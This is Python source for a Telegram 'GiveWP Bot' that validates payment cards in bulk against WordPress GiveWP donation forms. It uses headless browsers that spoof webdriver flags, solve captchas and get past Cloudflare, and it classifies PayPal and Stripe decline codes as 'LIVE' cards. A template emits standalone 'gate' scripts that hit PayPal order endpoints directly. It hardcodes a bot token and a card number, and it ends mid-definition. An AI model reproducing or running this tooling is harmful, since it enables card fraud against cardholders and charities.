#!/usr/bin/env python3
"""GiveWP Bot v29 — Playwright Only. Final."""
import os, sys, asyncio, json, re, time, random, threading, base64, traceback
from datetime import datetime
from io import BytesIO
from urllib.parse import urlparse

os.environ.setdefault("PLAYWRIGHT_BROWSERS_PATH", "/ms-playwright")

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8689698569:AAEKe4aG2sNS0yDiGg0OVFD2TfCHSLwLlDc")
OWNER_ID = int(os.environ.get("OWNER_ID", "6843321125"))
ADMINS = [str(OWNER_ID)]
TEST_CARD = os.environ.get("TEST_CARD", "4217834081794714|11|26|614")
TWOCAPTCHA_KEY = os.environ.get("TWOCAPTCHA_KEY", "")
PROXY_URL = os.environ.get("PROXY_URL", "")

if not BOT_TOKEN or ":" not in BOT_TOKEN:
    print("❌ BOT_TOKEN invalid"); sys.exit(1)

import telebot
from telebot import types
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings()

try:
    from playwright.async_api import async_playwright
    HAS_PW = True
except ImportError:
    HAS_PW = False
    print("❌ Playwright required")

try:
    from fake_useragent import UserAgent
    _UA = UserAgent()
    def rua():
        try: return _UA.random
        except: return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36"
except:
    def rua(): return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

waiting_users = {}
reply_mode = {}
processing_status = {}
if not os.path.exists("blockusers.txt"): open("blockusers.txt", "w").close()

PAYPAL_META = "7d9928a1f3f1fbc240cfd71a3eefe835"
BRAINTREE_SDK = "3.32.0-payments-sdk-dev"
FIRST = ["James","John","Robert","Michael","William","David"]
LAST = ["Smith","Johnson","Williams","Brown","Jones","Garcia"]
CITIES = ["New York","Los Angeles","Chicago","Houston"]
STATES = ["NY","CA","IL","TX"]
ZIPS = ["10001","90001","60601","77001"]
STREETS = ["123 Main St","456 Oak Ave","789 Pine Rd"]


def safe_send(cid, text, markup=None, retries=3):
    for _ in range(retries):
        try: return bot.send_message(cid, text, reply_markup=markup)
        except Exception as e:
            if "429" in str(e):
                w = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                time.sleep(min(w, 60))
            else: break
    return None

def safe_edit(cid, mid, text, retries=3):
    for _ in range(retries):
        try: return bot.edit_message_text(chat_id=cid, message_id=mid, text=text)
        except Exception as e:
            if "429" in str(e):
                w = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                time.sleep(min(w, 60))
            else: break
    return None

def safe_doc(cid, data, fn, cap=""):
    try: return bot.send_document(cid, (fn, BytesIO(data)), caption=cap)
    except: return None

def is_blocked(uid):
    try:
        with open("blockusers.txt") as f: return str(uid) in f.read().splitlines()
    except: return False


class Cls:
    PAYPAL = {
        "CHARGE_SUCCESS": ["status\":\"COMPLETED","status\":\"APPROVED\"","donation was successful"],
        "ORDER_NOT_APPROVED": ["order_not_approved","not yet approved","payer has not yet approved"],
        "PAYER_CANNOT_PAY": ["payer cannot pay","cannot pay for this transaction","payee blocked","payer_cannot_pay"],
        "INSUFFICIENT_FUNDS": ["insufficient_funds","insufficient funds","not enough funds","nsf"],
        "DO_NOT_HONOR": ["do_not_honor","do not honor"],
        "ACCOUNT_CLOSED": ["account_closed","account closed"],
        "LOST_OR_STOLEN": ["lost_or_stolen","lost or stolen"],
        "CVV2_FAILURE": ["cvv2_failure","cvv2 failure"],
        "CVV_FAILURE": ["cvv_failure","security code invalid"],
        "SUSPECTED_FRAUD": ["suspected_fraud","suspected fraud"],
        "GENERIC_DECLINE": ["generic_decline","generic decline"],
        "RESTRICTED_OR_INACTIVE_ACCOUNT": ["restricted_or_inactive","restricted account"],
        "INVALID_OR_RESTRICTED_CARD": ["invalid_or_restricted","invalid card"],
        "EXPIRED_CARD": ["expired_card","expired card","card expired"],
        "AUTHENTICATION_REQUIRED": ["authentication_required","3d secure required"],
        "PAYER_ACTION_REQUIRED": ["payer_action_required"],
        "TX_ATTEMPTS_EXCEED_LIMIT": ["tx_attempts_exceed","attempts exceed"],
        "SECURITY_VIOLATION": ["security_violation"],
        "COMPLIANCE_VIOLATION": ["compliance_violation"],
        "TRANSACTION_NOT_PERMITTED": ["transaction_not_permitted"],
        "PAYMENT_DENIED": ["payment_denied"],
        "APPROVED_PENDING_CAPTURE": ["paypal orders are captured","pending capture"],
        "INVALID_ACCOUNT": ["invalid_account"],
        "REATTEMPT_NOT_PERMITTED": ["reattempt_not_permitted"],
        "ACCOUNT_BLOCKED_BY_ISSUER": ["account_blocked_by_issuer"],
        "PICKUP_CARD_SPECIAL_CONDITIONS": ["pickup_card"],
        "INVALID_TRANSACTION": ["invalid_transaction"],
        "CRYPTOGRAPHIC_FAILURE": ["cryptographic_failure"],
        "TRANSACTION_CANNOT_BE_COMPLETED": ["transaction_cannot_be_completed"],
        "DECLINED_PLEASE_RETRY": ["declined_please_retry"],
        "INSTRUMENT_DECLINED": ["instrument_declined"],
    }
    STRIPE = {
        "STRIPE_INSUFFICIENT_FUNDS": ["insufficient_funds"],
        "STRIPE_GENERIC_DECLINE": ["generic_decline"],
        "STRIPE_EXPIRED_CARD": ["expired_card"],
        "STRIPE_FRAUDULENT": ["fraudulent"],
        "STRIPE_LOST_CARD": ["lost_card"],
        "STRIPE_STOLEN_CARD": ["stolen_card"],
        "STRIPE_RESTRICTED_CARD": ["restricted_card"],
        "STRIPE_PICKUP_CARD": ["pickup_card"],
        "STRIPE_INCORRECT_CVC": ["incorrect_cvc","invalid_cvc"],
        "STRIPE_INCORRECT_NUMBER": ["incorrect_number","invalid_number"],
        "STRIPE_INCORRECT_ZIP": ["incorrect_zip"],
        "STRIPE_DO_NOT_HONOR": ["do_not_honor"],
        "STRIPE_CARD_VELOCITY_EXCEEDED": ["card_velocity_exceeded"],
        "STRIPE_SECURITY_VIOLATION": ["security_violation"],
        "STRIPE_PROCESSING_ERROR": ["processing_error"],
        "STRIPE_AUTHENTICATION_REQUIRED": ["authentication_required"],
    }
    DEAD = {
        "CLOUDFLARE": ["just a moment","checking your browser","verifying you are","cf-browser-verification"],
        "CAPTCHA": ["captcha","not a robot","recaptcha","hcaptcha","turnstile"],
        "GATEWAY_DISABLED": ["gateway is not enabled","payment gateway is not"],
        "FORM_NOT_PUBLISHED": ["form not published"],
        "SPAM": ["flagged as spam"],
        "NO_FORM": ["form not found","no donation form"],
        "NO_PAYPAL": ["paypal not available"],
        "PAYPAL_ORDER_MISSING": ["paypal order id is missing","order id is missing"],
    }

    @classmethod
    def classify(cls, text):
        if not text: return "DEAD", "EMPTY"
        text = text.strip()
        up = text.upper(); low = text.lower()

        # ═══ 1. JSON (الأولوية) ═══
        try:
            js = json.loads(text)
            success = js.get("success")
            if success is True:
                return "LIVE", "CHARGE_SUCCESS"
            if success is False:
                data = js.get("data", {})
                err = json.dumps(data, ensure_ascii=False).upper()
                for code, kws in cls.PAYPAL.items():
                    for kw in kws:
                        if kw.upper() in err: return "LIVE", code
                for code, kws in cls.STRIPE.items():
                    for kw in kws:
                        if kw.upper() in err: return "LIVE", code
                return "DEAD", "SUCCESS_FALSE"
        except: pass

        # ═══ 2. PayPal codes ═══
        for code, kws in cls.PAYPAL.items():
            for kw in kws:
                if kw in low: return "LIVE", code

        # ═══ 3. Stripe codes ═══
        for code, kws in cls.STRIPE.items():
            for kw in kws:
                if kw in low: return "LIVE", code

        # ═══ 4. DEAD ═══
        for code, kws in cls.DEAD.items():
            for kw in kws:
                if kw in low: return "DEAD", code

        return "UNKNOWN", "UNKNOWN"


class PW:
    def __init__(self, url, card):
        self.url = url; self.card = card
        self.debug = {"steps":[],"network":[],"paypal":[],"stripe":[],"amount":None,
                      "form":None,"pp_frame":False,"card_filled":False,"captcha":False,
                      "cloudflare":False,"extracted":{},"raw":"","platform":"unknown",
                      "order_id":None}

    def log(self, m): self.debug["steps"].append(m)

    async def _on_resp(self, resp):
        try:
            u = resp.url; body = ""
            if any(k in u for k in ["create_order","confirm-payment","approve_order",
                                     "admin-ajax.php","give_process","paypal.com/v2","api.stripe.com"]):
                try: body = await resp.text()
                except: pass
                self.debug["network"].append({"url":u[:150],"status":resp.status,"body":body[:2000]})
                if "create_order" in u:
                    try:
                        js = json.loads(body)
                        if isinstance(js.get("data"),dict) and js["data"].get("id"):
                            self.debug["order_id"] = js["data"]["id"]
                    except: pass
                if "paypal.com" in u or "confirm-payment" in u or "approve_order" in u:
                    self.debug["paypal"].append(body[:2000])
                    self.debug["raw"] = body[:2000]
                if "stripe" in u.lower():
                    self.debug["stripe"].append(body[:2000])
        except: pass

    async def run(self):
        if not HAS_PW: return self._err("NO_PW")
        try:
            async with async_playwright() as p:
                proxy = None
                if PROXY_URL:
                    px = urlparse(PROXY_URL)
                    if px.username and px.password:
                        proxy = {"server":f"{px.scheme}://{px.hostname}:{px.port}",
                                 "username":px.username,"password":px.password}
                    else:
                        proxy = {"server": PROXY_URL}
                browser = await p.chromium.launch(headless=True, proxy=proxy,
                    args=["--no-sandbox","--disable-setuid-sandbox","--disable-dev-shm-usage",
                          "--disable-gpu","--single-process","--no-zygote",
                          "--disable-blink-features=AutomationControlled","--ignore-certificate-errors"])
                try:
                    ctx = await browser.new_context(user_agent=rua(),
                        viewport={"width":1366,"height":900}, locale="en-US",
                        timezone_id="America/New_York", ignore_https_errors=True)
                    await ctx.add_init_script("""
                        Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
                        window.chrome={runtime:{}};
                    """)
                    page = await ctx.new_page()
                    page.on("response", self._on_resp)
                    return await self._exec(page)
                finally:
                    try: await browser.close()
                    except: pass
        except Exception as e:
            return self._err(f"LAUNCH: {str(e)[:100]}")

    def _err(self, code):
        return {"status":"DEAD","code":code,"raw":"","debug":self.debug}

    async def _exec(self, page):
        try:
            self.log("[1] goto")
            try: await page.goto(self.url, wait_until="domcontentloaded", timeout=30000)
            except: pass
            await asyncio.sleep(2)

            html = await page.content()
            if any(x in html.lower() for x in ["just a moment","verifying you are"]):
                self.debug["cloudflare"] = True
                await self._human(page)
                for _ in range(5):
                    await asyncio.sleep(5); html = await page.content()
                    if "just a moment" not in html.lower(): break
                else: return self._err("CLOUDFLARE")

            if any(x in html.lower() for x in ["g-recaptcha","hcaptcha","turnstile"]):
                self.debug["captcha"] = True
                await self._solve_captcha(page, html)

            self.debug["platform"] = self._platform(html)
            self.debug["extracted"] = self._ext(html)

            form = await self._find_form(page)
            if not form: return self._err("NO_FORM")
            self.debug["form"] = form

            await self._human(page)
            await self._fill(page)

            amt = await self._amount(page)
            self.debug["amount"] = amt
            self.log(f"[9] amount=${amt}")

            await self._terms(page)

            if not await self._donate(page): return self._err("NO_DONATE")
            await asyncio.sleep(3)

            pp = await self._wait_pp(page, 20)
            if not pp:
                t = await page.inner_text("body")
                st, cd = Cls.classify(t)
                return {"status":st,"code":cd,"raw":t[:2000],"debug":self.debug}
            self.debug["pp_frame"] = True

            if not await self._card(pp): return self._err("CARD_FAIL")
            self.debug["card_filled"] = True

            await self._submit(pp, page)
            await asyncio.sleep(5)

            return await self._read(page, pp)
        except Exception as e:
            return self._err(f"EXEC: {str(e)[:120]}")

    async def _human(self, page):
        try:
            for _ in range(2):
                await page.mouse.move(random.randint(100,1000), random.randint(100,700))
                await asyncio.sleep(0.2)
            await page.mouse.wheel(0, random.randint(200,500))
            await asyncio.sleep(0.3)
        except: pass

    def _platform(self, html):
        low = html.lower()
        if "give-form" in low or "give-amount" in low: return "givewp"
        if "woocommerce" in low or "wc-ajax" in low: return "woocommerce"
        if "stripe.com/v3" in low or "js.stripe.com" in low: return "stripe"
        if "paypal.com/sdk" in low: return "paypal"
        return "unknown"

    def _ext(self, html):
        info = {}
        m = re.search(r'name="give-form-id-prefix"\s*value="([^"]*)"', html)
        if m: info["form1"] = m.group(1)
        m = re.search(r'name="give-form-id"\s*value="([^"]*)"', html)
        if m: info["form2"] = m.group(1)
        info["form_id"] = info.get("form2", "?")
        m = re.search(r'name="give-form-hash"\s*value="([^"]*)"', html)
        if m: info["nonce"] = m.group(1)
        m = re.search(r'name="give-form-minimum"\s*value="([^"]*)"', html)
        if m: info["min"] = m.group(1)
        m = re.search(r'name="give-price-id"\s+value="([^"]*)"', html)
        if m: info["price_id"] = m.group(1)
        return info

    async def _find_form(self, page):
        sels = ["form.give-form","form[id*='give-form']","form[class*='give-form']",
                ".give-form-wrap form","input[name='give-amount']","input[name='give-form-id']",
                "input[name='give-form-hash']","form[id*='give']","button.give-submit",
                "input.give-submit"]
        for attempt in range(15):
            for sel in sels:
                try:
                    if await page.locator(sel).first.count() > 0: return "main"
                except: continue
            if attempt < 14: await asyncio.sleep(1)
        for fr in page.frames:
            if fr == page.main_frame: continue
            for sel in sels:
                try:
                    if await fr.locator(sel).count() > 0: return "iframe"
                except: continue
        try:
            shadow = await page.evaluate("""()=>{const r=[];const s=(root)=>{if(!root)return;
                root.querySelectorAll('form,[id*="give"]').forEach(f=>{if(f.querySelector('input[name*="give"],input[name*="amount"]'))r.push(f.id||'s')});
                root.querySelectorAll('*').forEach(el=>{if(el.shadowRoot)s(el.shadowRoot)});};s(document);return r;}""")
            if shadow: return "shadow"
        except: pass
        for _ in range(3):
            await page.mouse.wheel(0, 500); await asyncio.sleep(1)
        for sel in sels:
            try:
                if await page.locator(sel).first.count() > 0: return "post-scroll"
            except: continue
        try:
            for f in await page.locator("form").all():
                if await f.locator("input").count() >= 2: return "fallback"
        except: pass
        return None

    async def _fill(self, page):
        first = random.choice(FIRST); last = random.choice(LAST)
        email = f"u{int(time.time()*1000)%999999}@gmail.com"
        street = random.choice(STREETS); city = random.choice(CITIES)
        state = random.choice(STATES); zp = random.choice(ZIPS)
        phone = f"555{random.randint(1000000,9999999)}"
        hints = {'first':first,'given':first,'fname':first,'last':last,'family':last,
                 'surname':last,'email':email,'mail':email,'address':street,'street':street,
                 'city':city,'town':city,'state':state,'province':state,'zip':zp,'postal':zp,
                 'postcode':zp,'phone':phone,'tel':phone,'name':f"{first} {last}"}
        for fr in page.frames:
            try:
                for inp in await fr.locator("input").all():
                    try:
                        t = await inp.get_attribute("type") or "text"
                        if t not in ("text","email","tel","url","number"): continue
                        if not await inp.is_visible(timeout=100): continue
                        if await inp.input_value(): continue
                        key = ((await inp.get_attribute("name") or "") + "|" +
                               (await inp.get_attribute("id") or "") + "|" +
                               (await inp.get_attribute("placeholder") or "")).lower()
                        for h,v in hints.items():
                            if h in key:
                                await inp.fill(v); break
                        else:
                            if t == "email": await inp.fill(email)
                            elif t == "tel": await inp.fill(phone)
                    except: continue
                for sel in await fr.locator("select").all():
                    try:
                        if not await sel.is_visible(timeout=100): continue
                        cur = await sel.input_value()
                        if cur and cur not in ("","0","-1"): continue
                        sn = (await sel.get_attribute("name") or "").lower()
                        if 'country' in sn:
                            for v in ['US','United States']:
                                try: await sel.select_option(v); break
                                except: continue
                        elif 'state' in sn:
                            try: await sel.select_option(state)
                            except:
                                try: await sel.select_option(index=1)
                                except: pass
                        else:
                            for o in await sel.locator("option").all():
                                v = await o.get_attribute("value")
                                if v and v not in ("","0","-1"):
                                    try: await sel.select_option(v); break
                                    except: continue
                    except: continue
            except: continue

    async def _amount(self, page):
        """يختار أصغر مبلغ من الفورم"""
        levels = []
        for fr in page.frames:
            try:
                for b in await fr.locator("[data-price]").all():
                    try:
                        p = await b.get_attribute("data-price")
                        if p and float(p) > 0: levels.append((float(p), b))
                    except: continue
                for r in await fr.locator("input[type='radio']").all():
                    try:
                        v = await r.get_attribute("value")
                        n = await r.get_attribute("name") or ""
                        if v and any(k in n.lower() for k in ['amount','price','level']):
                            if float(v) > 0: levels.append((float(v), r))
                    except: continue
            except: continue
        levels.sort(key=lambda x: x[0])
        self.log(f"  levels: {[l[0] for l in levels[:5]]}")
        if levels:
            for val, el in levels:
                try:
                    await el.scroll_into_view_if_needed()
                    tag = await el.evaluate("el=>el.tagName.toLowerCase()")
                    if tag == "input" and (await el.get_attribute("type")) == "radio":
                        await el.check(force=True)
                    else:
                        try: await el.click(timeout=2000)
                        except: await el.click(force=True, timeout=2000)
                    return str(val)
                except: continue
        min_amt = self.debug["extracted"].get("min")
        if min_amt:
            for fr in page.frames:
                for sel in ["input[name='give-amount']","input[name*='custom-amount']"]:
                    try:
                        inp = fr.locator(sel).first
                        if await inp.count() > 0 and await inp.is_visible(timeout=200):
                            await inp.fill(min_amt); return min_amt
                    except: continue
        for amt in ["1","2","3","5"]:
            for fr in page.frames:
                try:
                    btn = fr.get_by_role("button", name=re.compile(rf"^\${amt}(\.00)?$")).first
                    if await btn.count() > 0:
                        await btn.click(timeout=2000); return amt
                except: continue
        return None

    async def _terms(self, page):
        for fr in page.frames:
            try:
                for cb in await fr.locator("input[type='checkbox']").all():
                    try:
                        key = ((await cb.get_attribute("name") or "") + "|" +
                               (await cb.get_attribute("id") or "")).lower()
                        if any(k in key for k in ['terms','agree','accept','condition','privacy','consent']):
                            if not await cb.is_checked():
                                try: await cb.check(force=True)
                                except:
                                    try: await cb.click(force=True)
                                    except: pass
                    except: continue
            except: continue

    async def _donate(self, page):
        sels = ["button.give-submit","input.give-submit","button[type='submit'][class*='give']",
                "button[id*='donate' i]","button[name*='donate' i]",
                "input[type='submit'][value*='Donate' i]",
                "button:has-text('Donate')","button:has-text('Give')",
                "button:has-text('Submit')","button:has-text('Pay')",
                "button:has-text('Continue')","button[type='submit']","input[type='submit']"]
        for fr in page.frames:
            for sel in sels:
                try:
                    btn = fr.locator(sel).first
                    if await btn.count() > 0 and await btn.is_visible(timeout=300):
                        await btn.scroll_into_view_if_needed()
                        try: await btn.click(timeout=3000)
                        except: await btn.click(force=True, timeout=3000)
                        return True
                except: continue
        return False

    async def _wait_pp(self, page, timeout=20):
        for _ in range(timeout*2):
            for fr in page.frames:
                if fr == page.main_frame: continue
                if any(k in fr.url.lower() for k in ["paypal","braintree","card","stripe"]):
                    try:
                        if await fr.locator("input").count() > 0: return fr
                    except: continue
            try:
                if await page.locator("input[autocomplete='cc-number'],input[name*='cardnumber']").first.count() > 0:
                    return page
            except: pass
            await page.wait_for_timeout(400)
        return None

    async def _card(self, frame):
        try:
            p = self.card.strip().split("|")
            n, mm, yy, cvc = p[0],p[1],p[2],p[3].strip()
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            await asyncio.sleep(1.5)
            all_fr = [frame]
            try:
                for f in frame.frames: all_fr.append(f)
            except: pass
            async def fill(sels, val):
                for fr in all_fr:
                    for sel in sels:
                        try:
                            loc = fr.locator(sel).first
                            if await loc.count() > 0:
                                await loc.click(timeout=800)
                                await loc.fill("", timeout=800)
                                for ch in str(val): await loc.type(ch, delay=20)
                                return True
                        except: continue
                return False
            await fill(["input[type='email']","input[name*='email']"],
                       f"u{int(time.time()*1000)%999999}@gmail.com")
            if not await fill(["input#credit-card-number","input[name='cardnumber']",
                               "input[autocomplete='cc-number']","input[placeholder*='Card' i]",
                               "input[inputmode='numeric']"], n): return False
            await asyncio.sleep(0.4)
            exp = await fill(["input#expiration-date","input[name='exp']",
                              "input[autocomplete='cc-exp']",
                              "input[placeholder*='MM / YY' i]"], f"{mm}/{yy}")
            if not exp:
                for fr in all_fr:
                    for sel in ["select[name='expiration-month']","input[name='expiration-month']"]:
                        try:
                            loc = fr.locator(sel).first
                            if await loc.count() > 0:
                                tag = await loc.evaluate("el=>el.tagName.toLowerCase()")
                                if tag == "select":
                                    try: await loc.select_option(mm)
                                    except: pass
                                else: await loc.fill(mm)
                                break
                        except: continue
                for fr in all_fr:
                    for sel in ["select[name='expiration-year']","input[name='expiration-year']"]:
                        try:
                            loc = fr.locator(sel).first
                            if await loc.count() > 0:
                                tag = await loc.evaluate("el=>el.tagName.toLowerCase()")
                                if tag == "select":
                                    try: await loc.select_option(f"20{yy}")
                                    except: pass
                                else: await loc.fill(yy)
                                break
                        except: continue
            await asyncio.sleep(0.4)
            await fill(["input#cvv","input#cvc","input[name='cvv']",
                        "input[name='securityCode']","input[autocomplete='cc-csc']",
                        "input[placeholder*='CVV' i]"], cvc)
            await asyncio.sleep(0.4)
            return True
        except: return False

    async def _submit(self, frame, page):
        for fr in [frame, page.main_frame] + list(page.frames):
            if not fr: continue
            for kw in ['Pay','Continue','Complete','Confirm','Submit']:
                try:
                    btn = fr.locator(f"button:has-text('{kw}')").first
                    if await btn.count() > 0 and await btn.is_visible(timeout=300):
                        try: await btn.click(timeout=3000)
                        except: await btn.click(force=True, timeout=3000)
                        return True
                except: continue
            try:
                btn = fr.locator("button[type='submit']").first
                if await btn.count() > 0 and await btn.is_visible(timeout=300):
                    try: await btn.click(timeout=3000)
                    except: await btn.click(force=True, timeout=3000)
                    return True
            except: continue
        return False

    async def _read(self, page, frame):
        for body in self.debug["paypal"]:
            st, cd = Cls.classify(body)
            if st == "LIVE": return {"status":"LIVE","code":cd,"raw":body[:2000],"debug":self.debug}
            if cd == "PAYPAL_ORDER_MISSING": return {"status":"DEAD","code":cd,"raw":body[:2000],"debug":self.debug}
        for body in self.debug["stripe"]:
            st, cd = Cls.classify(body)
            if st == "LIVE": return {"status":"LIVE","code":cd,"raw":body[:2000],"debug":self.debug}
        for net in self.debug["network"]:
            st, cd = Cls.classify(net.get("body",""))
            if st == "LIVE": return {"status":"LIVE","code":cd,"raw":net["body"][:2000],"debug":self.debug}
        for fr in [frame, page.main_frame] + list(page.frames):
            if not fr: continue
            try:
                t = await fr.inner_text("body")
                if t:
                    st, cd = Cls.classify(t)
                    if st == "LIVE": return {"status":"LIVE","code":cd,"raw":t[:2000],"debug":self.debug}
            except: continue
        try:
            for fr in [frame, page.main_frame]:
                if not fr: continue
                for a in await fr.locator("[role='alert'],.give_error,.error").all():
                    t = await a.inner_text()
                    st, cd = Cls.classify(t)
                    if st == "LIVE": return {"status":"LIVE","code":cd,"raw":t[:2000],"debug":self.debug}
        except: pass
        if self.debug.get("raw"):
            st, cd = Cls.classify(self.debug["raw"])
            return {"status":st,"code":cd,"raw":self.debug["raw"][:2000],"debug":self.debug}
        return {"status":"UNKNOWN","code":"NO_RESPONSE","raw":"","debug":self.debug}

    async def _solve_captcha(self, page, html):
        if not TWOCAPTCHA_KEY: return False
        try:
            m = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
            if not m: m = re.search(r'sitekey["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
            if not m: return False
            sitekey = m.group(1)
            r = requests.post("https://2captcha.com/in.php", data={
                "key":TWOCAPTCHA_KEY,"method":"userrecaptcha","googlekey":sitekey,
                "pageurl":self.url,"json":1}, timeout=30).json()
            if r.get("status") != 1: return False
            task_id = r["request"]
            for _ in range(30):
                await asyncio.sleep(5)
                res = requests.get(f"https://2captcha.com/res.php?key={TWOCAPTCHA_KEY}&action=get&id={task_id}&json=1", timeout=30).json()
                if res.get("status") == 1:
                    token = res["request"]
                    await page.evaluate(f"""()=>{{const el=document.querySelector('[name="g-recaptcha-response"]');if(el)el.value="{token}";}}""")
                    return True
            return False
        except: return False


def check(url, card):
    """Playwright فقط — مفيش Requests"""
    if not HAS_PW:
        return {"status":"DEAD","code":"NO_PW","debug":{}}
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(PW(url, card).run())
        finally:
            loop.close()
    except Exception as e:
        return {"status":"DEAD","code":f"PW_ERR: {str(e)[:100]}","debug":{}}


GATE_TPL = '''"""Gate: {domain} | Form: {form_id} | Amount: {amount}"""
import requests, re, base64, json, random
from requests_toolbelt.multipart.encoder import MultipartEncoder

META = "{meta}"
SDK = "{sdk}"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36"


class PayPal:
    def __init__(self):
        self.url = "{url}"
        self.host = "{host}"
        self.path = "{path}"
        self.base = f"https://{{self.host}}"
        self.ajax = f"{{self.base}}/wp-admin/admin-ajax.php"
        self.form1 = "{form1}"
        self.form2 = "{form2}"
        self.nonce = "{nonce}"
        self.pid = "{pid}"
        self.amt = "{amount}"
        self.au = None
        self.r = requests.Session()
        self.r.verify = False

    def _tok(self):
        try:
            r = self.r.get(self.url, headers={{"user-agent":UA}}, timeout=20, cookies=self.r.cookies)
            self.r.cookies.update(r.cookies)
            m = re.search(r'"data-client-token"\\s*:\\s*"([^"]+)"', r.text)
            if m:
                dec = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
                au = re.search(r'"accessToken":"([^"]+)"', dec)
                if au: self.au = au.group(1); return True
            m = re.search(r'"accessToken"\\s*:\\s*"([^"]{{20,}})"', r.text)
            if m: self.au = m.group(1); return True
        except: pass
        return False

    def _data(self):
        return MultipartEncoder({{
            "give-honeypot":(None,""),"give-form-id-prefix":(None,self.form1),
            "give-form-id":(None,self.form2),"give-form-title":(None,""),
            "give-current-url":(None,self.url),"give-form-url":(None,self.url),
            "give-form-minimum":(None,"5.00"),"give-form-maximum":(None,"999999.99"),
            "give-form-hash":(None,self.nonce),"give-price-id":(None,self.pid),
            "give-amount":(None,self.amt),"payment-mode":(None,"paypal-commerce"),
            "give-gateway":(None,"paypal-commerce"),
            "give_first":(None,random.choice(["James","John"])),
            "give_last":(None,random.choice(["Smith","Johnson"])),
            "give_email":(None,f"u{{random.randint(1000,99999)}}@gmail.com"),
            "card_name":(None,"Test"),
        }})

    def _create(self):
        d = self._data()
        h = {{"content-type":d.content_type,"origin":self.base,"referer":self.url,"user-agent":UA}}
        try:
            r = self.r.post(self.ajax, params={{"action":"give_paypal_commerce_create_order"}},
                           headers=h, data=d, cookies=self.r.cookies, timeout=20)
            js = r.json()
            if isinstance(js.get("data"),dict) and js["data"].get("id"): return js["data"]["id"]
        except: pass
        return None

    def _confirm(self, oid, cc):
        p = cc.strip().split("|")
        n, mm, yy, cvc = p[0],p[1],p[2],p[3].strip()
        if "20" in yy: yy = yy.split("20")[1]
        if len(yy) == 4: yy = yy[2:]
        h = {{"authority":"cors.api.paypal.com","accept":"*/*",
              "authorization":f"Bearer {{self.au}}","braintree-sdk-version":SDK,
              "content-type":"application/json","origin":"https://assets.braintreegateway.com",
              "paypal-client-metadata-id":META,"referer":"https://assets.braintreegateway.com/",
              "user-agent":UA}}
        j = {{"payment_source":{{"card":{{"number":n,"expiry":f"20{{yy}}-{{mm}}",
              "security_code":cvc,"attributes":{{"verification":{{"method":"SCA_WHEN_REQUIRED"}}}}}}}},
              "application_context":{{"vault":False}}}}
        try: return self.r.post(f"https://cors.api.paypal.com/v2/checkout/orders/{{oid}}/confirm-payment-source",
                                headers=h, json=j, timeout=20)
        except: return None

    def _approve(self, oid):
        d = self._data()
        h = {{"content-type":d.content_type,"origin":self.base,"referer":self.url,"user-agent":UA}}
        try:
            return self.r.post(self.ajax, params={{"action":"give_paypal_commerce_approve_order","order":oid}},
                              headers=h, data=d, cookies=self.r.cookies, timeout=20)
        except: return None

    def charge(self, cc):
        if not self._tok(): return {{"status":"DEAD","code":"NO_TOKEN","raw":""}}
        oid = self._create()
        if not oid: return {{"status":"DEAD","code":"CREATE_FAILED","raw":""}}
        cr = self._confirm(oid, cc)
        if cr and cr.status_code in (400,422):
            for c in ["ORDER_NOT_APPROVED","INSUFFICIENT_FUNDS","PAYER_CANNOT_PAY",
                      "EXPIRED_CARD","CVV2_FAILURE","DO_NOT_HONOR","GENERIC_DECLINE"]:
                if c in cr.text.upper(): return {{"status":"LIVE","code":c,"raw":cr.text[:500]}}
        ar = self._approve(oid)
        if ar:
            try:
                js = json.loads(ar.text)
                if js.get("success") is True: return {{"status":"LIVE","code":"CHARGE_SUCCESS","raw":ar.text[:500]}}
            except: pass
            for c in ["ORDER_NOT_APPROVED","INSUFFICIENT_FUNDS","PAYER_CANNOT_PAY"]:
                if c in ar.text.upper(): return {{"status":"LIVE","code":c,"raw":ar.text[:500]}}
        return {{"status":"DEAD","code":"FAILED","raw":""}}


if __name__ == "__main__":
    p = PayPal()
    r = p.charge("{test_card}")
    print(f"Status: {{r['status']}}")
    print(f"Code: {{r['code']}}")
'''


def gen_gate(url, dbg, card):
    info = dbg.get("extracted", {})
    p = urlparse(url)
    form1 = info.get("form1", "")
    form2 = info.get("form2", "")
    if not form1 and form2: form1 = f"{form2}-1"
    return GATE_TPL.format(
        domain=p.netloc, form_id=form2 or "?", amount=dbg.get("amount", "5.00"),
        meta=PAYPAL_META, sdk=BRAINTREE_SDK, url=url, host=p.netloc,
        path=p.path + ("?" + p.query if p.query else ""),
        form1=form1, form2=form2, nonce=info.get("nonce",""),
        pid=info.get("price_id","3"), test_card=card)


@bot.message_handler(commands=["start"])
def start_cmd(msg):
    if is_blocked(msg.from_user.id):
        safe_send(msg.chat.id, "🚫 Blocked."); return
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📖 Help", callback_data="help"))
    kb.add(types.InlineKeyboardButton("💬 Feedback", callback_data="fb"))
    text = f"""<b>⚡ GiveWP Bot v29</b>

<b>Name:</b> {msg.from_user.first_name}
<b>ID:</b> <code>{msg.from_user.id}</code>

━━━━━━━━━━━━━━━━━━━━
/paypal <code>&lt;url&gt;</code>
/mass — ملف روابط
/test — فحص سريع
/stop — إيقاف
━━━━━━━━━━━━━━━━━━━━
🔥 Playwright Only"""
    safe_send(msg.chat.id, text, kb)


@bot.callback_query_handler(func=lambda c: c.data == "help")
def cb_help(call):
    try: bot.answer_callback_query(call.id)
    except: pass
    try: bot.edit_message_text("<b>📖 Help</b>\n\n/paypal URL\n/mass\n/test\n/stop", call.message.chat.id, call.message.message_id)
    except: pass


@bot.callback_query_handler(func=lambda c: c.data == "fb")
